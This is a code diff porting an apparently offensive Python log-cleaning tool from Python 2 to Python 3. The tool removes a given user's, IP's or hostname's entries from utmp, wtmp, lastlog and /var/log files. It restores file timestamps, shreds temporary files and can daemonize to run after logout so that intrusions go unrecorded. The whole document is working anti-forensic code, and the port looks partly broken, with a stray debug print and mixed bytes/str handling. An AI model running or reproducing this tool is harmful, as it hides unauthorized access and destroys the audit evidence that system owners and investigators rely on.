@@ -73,7 +73,7 @@ def ask_confirmation(message):
     """
     answers = {"y": True, "yes": True, "n": False, "no": False}
     while True:
-        response = raw_input("[ ] %s Confirm? [Y/n] " % message).lower()
+        response = input("[ ] {}\n".format(message) + orange("Confirm? [Y/n] ")).lower()
         if response in answers:
             return answers[response]
         elif not response: # Default to yes.
@@ -115,25 +115,27 @@ def get_safe_mountpoint():
 
     p = subprocess.Popen(["mount", "-t", "tmpfs"], stdout=subprocess.PIPE)
     candidates, stderr = p.communicate()
+    candidates = candidates.decode()
     candidates = filter(lambda x: "rw" in x, candidates.split('\n'))
     for c in candidates:
         # Assert that the output of mount is sane
         device = c.split(" ")[2]
+        print(device[0])
         if device[0] != '/':
-            print error("%s doesn't seem to be a mountpoint..." % device)
+            print(error("%s doesn't seem to be a mountpoint..." % device))
             continue
 
         # Check that we have sufficient rights to create files there.
         if not os.access(device, os.W_OK):
             if VERBOSE:
-                print info("Unable to work in %s..." % device)
+                print(info("Unable to work in {}...".format(device)))
             continue
 
         # Verify that there is some space left on the device:
         statvfs = os.statvfs(device)
         if statvfs.f_bfree < 1000:  # Require at least 1000 free blocks
             if VERBOSE:
-                print info("Rejecting %s because there isn't enough space left..." % device)
+                print(info("Rejecting {} because there isn't enough space left...".format(device)))
             continue
 
         # OK, suitable place identified.
@@ -142,9 +144,9 @@ def get_safe_mountpoint():
 
     if SAFE_MOUNTPOINT is not None:
         if VERBOSE:
-            print success("Identified %s as a suitable working directory." % SAFE_MOUNTPOINT)
+            print(success("Identified {} as a suitable working directory.".format(SAFE_MOUNTPOINT)))
         return SAFE_MOUNTPOINT
-    error("Could not find a tmpfs mountpoint to work in! Aborting.")
+    print(error("Could not find a tmpfs mountpoint to work in! Aborting."))
     sys.exit(-1)
 
 # -----------------------------------------------------------------------------
@@ -163,19 +165,19 @@ def proper_overwrite(source, destination):
     :return: Whether the file could be overwritten.
     """
     if not os.path.exists(source) or not os.path.exists(destination):
-        print error("Either %s or %s does not exist! Logs have NOT been "
-                    "overwritten!" % (source, destination))
+        print(error("Either %s or %s does not exist! Logs have NOT been "
+                    "overwritten!" % (source, destination)))
         return False
     if not os.access(destination, os.W_OK):
-        print error("Cannot write to %s! Logs have NOT been overwritten!"
-                    % destination)
+        print(error("Cannot write to %s! Logs have NOT been overwritten!"
+                    % destination))
         return False
 
     stat = os.stat(destination)
     ret = os.system("cat %s > %s" % (source, destination))
     if ret != 0:
         if VERBOSE:
-            print warning("Command \"cat %s > %s\" failed!" % (source, destination))
+            print(warning("Command \"cat {} > {}\" failed!".format(source, destination)))
         return False
     os.utime(destination, (stat.st_atime, stat.st_mtime))
     return True
@@ -191,15 +193,15 @@ def secure_delete(target):
     :return: None
     """
     if not os.path.exists(target):  # Easiest deletion ever.
-        print error("Tried to delete a nonexistent file! (%s)" % target)
+        print(error("Tried to delete a nonexistent file! ({})".format(target)))
         return
 
     try:
         subprocess.call(["shred", "-uz", target])
     except OSError:  # Shred is not present on the machine.
         if VERBOSE:
-            print warning("shred is not available. Falling back to manual "
-                          "secure file deletion.")
+            print(warning("shred is not available. Falling back to manual "
+                          "secure file deletion."))
         f = None
         try:
             f = open(target, "ab+")
@@ -222,7 +224,7 @@ def clean_utmp(filename, username, ip, hostname):
     clean_file = ""
     global LAST_LOGIN, CHECK_MODE
     if not os.path.exists(filename):
-        print warning("%s does not exist." % filename)
+        print(warning("{} does not exist.".format(filename)))
         return  # Nothing to do
 
     f = None
@@ -234,8 +236,8 @@ def clean_utmp(filename, username, ip, hostname):
                 break
             # Assert that the last 20 bytes are 0s (the "__unused" field)
             if block[-20:] != "\x00" * 20:
-                print error("This distribution may not be using the expected UTMP block size. "
-                            "%s will NOT be cleaned!" % filename)
+                print(error("This distribution may not be using the expected UTMP block size. "
+                            "%s will NOT be cleaned!" % filename))
                 if f is not None:
                     f.close()
                 return
@@ -260,7 +262,7 @@ def clean_utmp(filename, username, ip, hostname):
                 clean_file += block
 
         if cleaned_entries == 0:  # Nothing to remove from the file. Error in the args?
-            print info("No entries to remove from %s." % filename)
+            print(info("No entries to remove from {}.".format(filename)))
         else:
             # Replace the old contents with the filtered one.
             tmp_file = get_temp_filename()
@@ -272,13 +274,13 @@ def clean_utmp(filename, username, ip, hostname):
                 if g is not None:
                     g.close()
             if proper_overwrite(tmp_file, filename):
-                print success("%s entries removed from %s!" % (cleaned_entries, filename))
+                print(success("{} entries removed from {}!".format(cleaned_entries, filename)))
             secure_delete(tmp_file)
         if f is not None:
             f.close()
 
     except IOError:
-        print error("Unable to read or write to %s. Logfile will NOT be cleaned." % filename)
+        print(error("Unable to read or write to {}. Logfile will NOT be cleaned.".format(filename)))
         if f is not None:
             f.close()
 
@@ -298,7 +300,7 @@ def clean_lastlog(filename, username, ip, hostname):
     :return:
     """
     if not os.path.exists(filename):
-        print warning("%s does not exist." % filename)
+        print(warning("{} does not exist.".format(filename)))
         return  # Nothing to do
 
     clean_file = ""
@@ -312,7 +314,7 @@ def clean_lastlog(filename, username, ip, hostname):
 
         block = f.read(LASTLOG_BLOCK_SIZE)
         lastlog_struct = struct.unpack(LASTLOG_UNPACK_STRING, block)
-        if lastlog_struct[2].strip("\x00") not in [hostname, ip]:
+        if lastlog_struct[2].strip(b"\x00") not in [hostname, ip]:
             return  # Nothing to do: the last log isn't from the current IP or hostname.
 
         if CHECK_MODE and not ask_confirmation("About to modify the following %s record: latest login from %s (%s): %s."
@@ -345,11 +347,11 @@ def clean_lastlog(filename, username, ip, hostname):
 
         if LAST_LOGIN["timestamp"] != 0:
             timestamp_str = datetime.datetime.fromtimestamp(int(LAST_LOGIN["timestamp"])).strftime('%Y-%m-%d %H:%M:%S')
-            print success("Lastlog set to %s from %s at %s" % (timestamp_str,
+            print(success("Lastlog set to %s from %s at %s" % (timestamp_str,
                                                                LAST_LOGIN["terminal"],
-                                                               LAST_LOGIN["hostname"]))
+                                                               LAST_LOGIN["hostname"])))
         else:
-            print success("Removed %s's login information from lastlog!" % username)
+            print(success("Removed {}'s login information from lastlog!".format(username)))
     finally:
         if f is not None:
             f.close()
@@ -382,8 +384,9 @@ def clean_generic_logs(files, ip, hostname, regexp):
     additional_files = None
     if platform.system() == "Linux":
         additional_files = LINUX_ADDITIONAL_LOGS
-    targets = set(filter(lambda x: x.strip(), var_logs.split('\n')) + additional_files)
 
+    var_logs = var_logs.decode()
+    targets = set(list(filter(lambda x: x.strip(), var_logs.split('\n'))) + additional_files)
     # Process the list of files given by the user.
     for f in files:
         if not os.path.isdir(f):
@@ -396,7 +399,7 @@ def clean_generic_logs(files, ip, hostname, regexp):
             continue
         if not os.access(log, os.R_OK | os.W_OK):
             if VERBOSE:
-                print warning("Unable to read or write to %s! Skipping..." % log)
+                print(warning("Unable to read or write to {}! Skipping...".format(log)))
             continue
 
         cleaned_entries = 0
@@ -416,12 +419,13 @@ def clean_generic_logs(files, ip, hostname, regexp):
                 if not line:
                     break
                 if ip in line or hostname in line or (regexp and re.search(regexp, line)):
-                    if CHECK_MODE and not ask_confirmation("About to delete the following line from %s: %s." % (log, line.rstrip("\n"))):
+                    #if CHECK_MODE and not ask_confirmation("About to delete the following line from %s:\n %s." % (log, line.rstrip("\n"))):
+                    if CHECK_MODE and not ask_confirmation(red("About to delete the following line from {}:\n".format(log)) + "{}.".format(line.rstrip("\n"))):
                         g.write(line)  # The user wants to keep this line.
                     else:
                         cleaned_entries += 1  # Exclude this line.
                 else:
-                    g.write(line)  # IP or hostname is not present. Write the line.
+                    g.write(bytes(line, encoding='utf-8'))  # IP or hostname is not present. Write the line.
         finally:
             if f is not None:
                 f.close()
@@ -431,12 +435,12 @@ def clean_generic_logs(files, ip, hostname, regexp):
         # Done reading the input file. Overwrite it if needed and report the findings.
         if cleaned_entries == 0:
             if VERBOSE or log in files:
-                print info("No entries to remove found in %s." % log)
+                print(info("No entries to remove found in {}.".format(log)))
             secure_delete(tmp_file)
             continue
         else:
             if proper_overwrite(tmp_file, log):
-                print success("%d lines removed from %s!" % (cleaned_entries, log))
+                print(success("%d lines removed from %s!" % (cleaned_entries, log)))
             secure_delete(tmp_file)
 
 ###############################################################################
@@ -461,7 +465,7 @@ def daemonize():
                 sys.exit(0)
         except OSError:
             _, e = sys.exc_info()[:2]
-            print "Error while forking! (%s)" % e.message
+            print("Error while forking! (%s)" % e.message)
             sys.exit(1)
 
     # Double fork to daemonize
@@ -471,7 +475,7 @@ def daemonize():
     os.umask(0)
     fork()
 
-    print success("The script has daemonized successfully.")
+    print(success("The script has daemonized successfully."))
     sys.stdout.flush()
 
     # Dirty trick to figure out when the user has disconnected from the current session:
@@ -503,7 +507,7 @@ def validate_args(args):
         if "USER" in os.environ:
             args.user = os.environ["USER"]
         else:
-            print error("Could not determine the username. Please specify it with the -u option.")
+            print(error("Could not determine the username. Please specify it with the -u option."))
             sys.exit(1)
 
     # Get the IP from the environment if none is given.
@@ -511,7 +515,7 @@ def validate_args(args):
         if "SSH_CONNECTION" in os.environ:
             args.ip = os.environ['SSH_CONNECTION'].split(' ')[0]
         else:
-            print error("Could not determine the IP address. Please specify it with the -i option.")
+            print(error("Could not determine the IP address. Please specify it with the -i option."))
             sys.exit(1)
 
     # Compile the regular expression for efficiency reasons
@@ -519,7 +523,7 @@ def validate_args(args):
         try:
             args.regexp = re.compile(args.regexp)
         except:
-            print error("The regular expression specified is invalid.")
+            print(error("The regular expression specified is invalid."))
             sys.exit(1)
 
     # Determine the hostname if needed.
@@ -527,16 +531,16 @@ def validate_args(args):
         try:
             args.hostname = socket.gethostbyaddr(args.ip)[0]
         except:
-            print error("Could not determine the hostname. Please specify it with the -n option.")
+            print(error("Could not determine the hostname. Please specify it with the -n option."))
             sys.exit(1)
 
     # Enable the --check option if requested.
     if args.check:
         if not sys.stdin.isatty():
-            print error("Cannot ask for confirmation without a TTY. Please rerun without --check.")
+            print(error("Cannot ask for confirmation without a TTY. Please rerun without --check."))
             sys.exit(1)
         if args.daemonize:
-            print error("The --check option is incompatible with --daemonize.")
+            print(error("The --check option is incompatible with --daemonize."))
             sys.exit(1)
         CHECK_MODE = True
 
@@ -544,16 +548,16 @@ def validate_args(args):
     if args.log_files is not None:
         for log in args.log_files:
             if not os.path.exists(log):
-                print error("%s does not exist!" % log)
+                print(error("{} does not exist!".format(log)))
                 sys.exit(1)
             if not os.access(log, os.R_OK | os.W_OK):
-                print error("%s is not readable and/or not writable!" % log)
+                print("{} is not readable and/or not writable!".format(log))
                 sys.exit(1)
 
     if args.daemonize:
         if not sys.stdin.isatty():
-            print warning("Cannot detect session termination without a TTY! The script will automatically "
-                          "start in 60 seconds. Make sure you log out before then, or run the script again later.")
+            print(warning("Cannot detect session termination without a TTY! The script will automatically "
+                          "start in 60 seconds. Make sure you log out before then, or run the script again later."))
         daemonize()
 
 # -----------------------------------------------------------------------------
@@ -586,11 +590,11 @@ if __name__ == "__main__":
         args.log_files = positional
 
     validate_args(args)
-    print info("Cleaning logs for %s (%s - %s)." % (args.user, args.ip, args.hostname))
+    print(info("Cleaning logs for %s (%s - %s)." % (args.user, args.ip, args.hostname)))
 
     system = platform.system()
     if system == "Windows":
-        print error("Windows isn't supported by this script!")
+        print("Windows isn't supported by this script!")
         sys.exit(1)
 
     get_safe_mountpoint()
@@ -600,7 +604,7 @@ if __name__ == "__main__":
             clean_utmp(log, args.user, args.ip, args.hostname)
         clean_lastlog(LINUX_LASTLOG_FILE, args.user, args.ip, args.hostname)
     else:
-        print error("UTMP/WTMP/lastlog cannot be cleaned on %s :(" % system)
+        print(error("UTMP/WTMP/lastlog cannot be cleaned on {} :(".format(system)))
 
     clean_generic_logs(args.log_files, args.ip, args.hostname, args.regexp)
 
